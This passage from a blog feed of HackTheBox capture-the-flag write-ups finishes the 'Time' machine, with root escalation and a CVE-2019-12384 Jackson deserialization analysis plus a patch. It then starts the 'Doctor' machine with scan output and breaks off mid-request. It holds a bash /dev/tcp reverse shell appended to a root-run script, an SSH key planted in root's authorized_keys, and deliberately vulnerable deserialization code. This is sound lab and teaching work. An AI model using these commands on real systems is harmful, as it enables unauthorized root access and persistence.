<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null |grep -v <span style="color:#e6db74">&#39;proc\|sys&#39;</span>
/usr/bin/timer_backup.sh
/dev/shm/payloadds9LXy
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
...&lt;SNIP&gt;...
</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ cat /usr/bin/timer_backup.sh
<span style="color:#75715e">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</code></pre></div><p>Interestingly, that script is writable by others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- <span style="color:#ae81ff">1</span> pericles pericles <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:05 /usr/bin/timer_backup.sh
</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -name <span style="color:#e6db74">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
   <span style="color:#ae81ff">795750</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">214</span> Oct <span style="color:#ae81ff">23</span> 06:46 /etc/systemd/system/timer_backup.timer
   <span style="color:#ae81ff">787186</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">159</span> Oct <span style="color:#ae81ff">23</span> 05:59 /etc/systemd/system/timer_backup.service
  <span style="color:#ae81ff">1317302</span>      <span style="color:#ae81ff">4</span> -rwxrw-rw-   <span style="color:#ae81ff">1</span> pericles pericles       <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:10 /usr/bin/timer_backup.sh
</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target
</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
pericles@time:~$ 
pericles@time:~$ cat /usr/bin/timer_backup.sh 
<span style="color:#75715e">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
bash -i &gt;&amp; /dev/tcp/10.10.14.72/9002 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ rlwrap nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.10.214] 57648
bash: cannot set terminal process group (411032): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# 
root@time:/# exit
</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9002                          
listening on [any] 9002 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 34182
bash: cannot set terminal process group (65312): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/#  echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39; &gt; /root/.ssh/authorized_keys
&lt;rj6mXxSIGq3E5ks1g+moK&#39; &gt; /root/.ssh/authorized_keys
root@time:/# exit
</code></pre></div><p>After that, I can login as root via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ ssh root@10.10.10.214
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               235
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:a553


...&lt;SNIP&gt;...
Last login: Tue Feb  9 14:41:33 2021
root@time:~# id
uid=0(root) gid=0(root) groups=0(root)
root@time:~# cut -c-16 root.txt 
27375f967f43232f
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
<h3 id="cve-2019-12384">CVE-2019-12384</h3>
<h4 id="causes">Causes</h4>
<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
<p><div class="img-container"><img src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  /></div>
</p>
<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;data&#39;</span>])){
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;mode&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;mode&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;2&#34;</span>){
                $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">tempnam</span>(<span style="color:#e6db74">&#34;/dev/shm&#34;</span>, <span style="color:#e6db74">&#34;payload&#34;</span>);
                $myfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($filename, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Unable to open file!&#34;</span>);
                $txt <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>]; <span style="color:#75715e">// Condition #1,  $txt controlled by user. no filter
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">fwrite</span>($myfile, $txt); 
                <span style="color:#a6e22e">fclose</span>($myfile);
                <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span style="color:#e6db74">$filename</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>, $cmdout, $ret);
                <span style="color:#a6e22e">unlink</span>($filename);
                <span style="color:#66d9ef">if</span>($ret <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>){
                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span>;
                }
                <span style="color:#66d9ef">else</span>{
                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span style="color:#f92672">.</span> $cmdout[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
                }
        }
        <span style="color:#66d9ef">else</span>{
                $json_ugly <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>];
                $json_pretty <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#a6e22e">json_decode</span>($json_ugly), <span style="color:#a6e22e">JSON_PRETTY_PRINT</span>);
                $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">.</span>$json_pretty<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
        }

}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>

<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
      require f
<span style="color:#66d9ef">end</span>

java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
content <span style="color:#f92672">=</span> f
puts content

mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
mapper<span style="color:#f92672">.</span>enableDefaultTyping() <span style="color:#75715e"># Condition #2, the uses of &#34;default typing&#34;.</span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@time:/opt/json_project# grep -Ri version
Binary file classpath/h2-1.4.199.jar matches
Binary file classpath/jackson-databind-2.9.8.jar matches
Binary file classpath/logback-core-1.3.0-alpha5.jar matches
Binary file classpath/jackson-core-2.9.8.jar matches
</code></pre></div><h4 id="mitigation">Mitigation</h4>
<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>

<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
      require f
<span style="color:#66d9ef">end</span>

java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
content <span style="color:#f92672">=</span> f
puts content

mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
mapper<span style="color:#f92672">.</span>activateDefaultTyping() <span style="color:#75715e"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">MapperFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span>); <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span><span style="color:#75715e"># ./time.sh patch [ip]</span>
project_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/json_project/&#34;</span>
new_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.11.0.jar&#34;</span>
old_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.9.8.jar&#34;</span>

<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;patch&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
	<span style="color:#75715e"># backup the original code</span>
	mkdir -p /dev/shm/orig/
	mv $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$old_jackson /dev/shm/orig/
	mv $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span> /dev/shm/orig/
	
	<span style="color:#75715e"># These file hosted from my machine</span>
	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/</span>$new_jackson<span style="color:#e6db74">&#34;</span> &gt; /tmp/$new_jackson
	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
	
	<span style="color:#75715e"># move the updated parser and jackson</span>
	cp /tmp/$new_jackson $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson 
	cp /tmp/parse.rb <span style="color:#e6db74">&#34;</span>$project_path<span style="color:#e6db74">&#34;</span>
	chmod +x $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
	
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;restore&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
	rm $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson
	rm $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
	
	mv <span style="color:#e6db74">&#34;/dev/shm/orig/</span>$old_jackson<span style="color:#e6db74">&#34;</span> $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>
	mv <span style="color:#e6db74">&#34;/dev/shm/orig/parse.rb&#34;</span> $project_path
	
	rm /tmp/$new_jackson 
	rm /tmp/parse.rb
	rm -r /dev/shm/orig/
	
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect  back. I checked the validator on the browser, and now it returned this  message.</p>
<pre><code>Validation failed: WARNING: An illegal reflective access operation has occurred
</code></pre><p><div class="img-container"><img src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  /></div>
</p>
<p>Well, it is working, isn’t it?</p>
<hr>
<h2 id="references">References</h2>
<p>Exploitation:</p>
<ul>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
</ul>
<p>Mitigation:</p>
<ul>
<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Doctor</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-doctor/</link>
      <pubDate>Sat, 08 May 2021 23:21:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-doctor/</guid>
      <description>Seven times seven is equal to SSTI</description>
      <content:encoded><![CDATA[<p>Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I&rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user&rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Server Side Template Injection</li>
<li>Splunk UF Exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>
<p>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></p>
</li>
<li>
<p>Nmap - Preinstalled in Kali Linux</p>
</li>
<li>
<p>Gobuster - <a href="https://github.com/OJ/gobuste">https://github.com/OJ/gobuste</a></p>
</li>
<li>
<p>Tplmap - <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
</li>
<li>
<p>SSTI Cheatsheet - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#</a></p>
</li>
<li>
<p>PySplunkWhisperer2 - <a href="https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py">https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py</a></p>
</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scans discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.3»
$ mkdir nmap; nmap -sC -sV -oN nmap/initial-doctor <span style="color:#e6db74">&#39;10.10.10.209&#39;</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.209
Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http     Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SplunkServerDefaultCert/organizationName<span style="color:#f92672">=</span>SplunkUser
| Issuer: commonName<span style="color:#f92672">=</span>SplunkCommonCA/organizationName<span style="color:#f92672">=</span>Splunk/stateOrProvinceName<span style="color:#f92672">=</span>CA/countryName<span style="color:#f92672">=</span>US
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">2048</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23 4e5c 546d <span style="color:#ae81ff">8895</span> 0f5f 8f42 5e90 <span style="color:#ae81ff">6787</span>
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page shows a kind of health service website called &ldquo;Doctor&rdquo; in the title.</p>
<p><div class="img-container"><img src="imgs/image-20210509010426119.png" alt="image-20210509010426119"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>URL brute force with <code>gobuster</code> didn&rsquo;t find any interesting results.</p>
<pre><code>/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.209/images/]
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.10.209/js/]
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.10.209/css/]
/contact.html         (Status: 200) [Size: 19848]
/blog.html            (Status: 200) [Size: 19848]
/about.html           (Status: 200) [Size: 19848]
/index.html           (Status: 200) [Size: 19848]
/services.html        (Status: 200) [Size: 19848]
/fonts                (Status: 301) [Size: 312] [--&gt; http://10.10.10.209/fonts/]
/departments.html     (Status: 200) [Size: 19848]
/server-status        (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 19848]
</code></pre><h3 id="tcp-80---doctorshtb">TCP 80 - doctors.htb</h3>
<p>Because adding a machine name with &ldquo;.htb&rdquo; as TLD to <code>/etc/hosts</code> file has become my habit (i.e <code>doctor.htb</code>), so at first, on the homepage, I didn&rsquo;t notice that there is an additional &ldquo;s&rdquo; on <code>info@doctors.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210509011106327.png" alt="image-20210509011106327"  /></div>
</p>
<p>Once I added <code>doctors.htb</code> to my <code>/etc/hosts</code> file, I refreshed the page with that hostname, and it presented a different web application.</p>
<p><div class="img-container"><img src="imgs/image-20210509011333267.png" alt="image-20210509011333267"  /></div>
</p>
<p>In the page source, I found a comment telling that the archive feature is still in beta testing.</p>
<p><div class="img-container"><img src="imgs/image-20210509013716799.png" alt="image-20210509013716799"  /></div>
</p>
<p>I&rsquo;ll note that <code>/archive</code>.</p>
<h4 id="gobuster-1">Gobuster</h4>
<p>I ran another gobuster scan, but it seems I&rsquo;ll just register an account this time.</p>
<pre><code>/logout               (Status: 302) [Size: 217] [--&gt; http://doctors.htb/home]
/register             (Status: 200) [Size: 4493]
/login                (Status: 200) [Size: 4204]
/home                 (Status: 302) [Size: 245] [--&gt; http://doctors.htb/login?next=%2Fhome]
/archive              (Status: 200) [Size: 101]
/account              (Status: 302) [Size: 251] [--&gt; http://doctors.htb/login?next=%2Faccount]
/server-status        (Status: 403) [Size: 276]
</code></pre><p>My account is only available for 20 minutes.</p>
<p><div class="img-container"><img src="imgs/image-20210509014205880.png" alt="image-20210509014205880"  /></div>
</p>
<p>The &ldquo;1&rdquo; icon was actually a page number with URL of <code>http://doctors.htb/home?page=1</code>.</p>
<h3 id="tcp-8089--splunk-universal-forwarder">TCP 8089  —  Splunk Universal Forwarder</h3>
<p>I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.</p>
<p>At the top, I can see the Splunk version.</p>
<p><div class="img-container"><img src="imgs/image-20210509014443695.png" alt="image-20210509014443695"  /></div>
</p>
<h4 id="finding-vulnerability">Finding vulnerability</h4>
<p>Knowing the version, I did a quick search on Google to look for available exploits, and I came across <code>hackbooktriks.xyz</code></p>
<ul>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence">https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence</a></li>
</ul>
<p>The original research was published in here:</p>
<ul>
<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
</ul>
<p>But it requires credentials. I&rsquo;ll just add this to my to do list.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-web">Shell as web</h3>
<h4 id="sql-injection---failed">SQL Injection - Failed</h4>
<p>I can create a post message on <code>doctors.htb</code> by visiting <a href="http://doctors.htb/post/new">http://doctors.htb/post/new</a>. Below is the example request</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /post/new <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">doctors.htb</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://doctors.htb/post/new</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">35</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
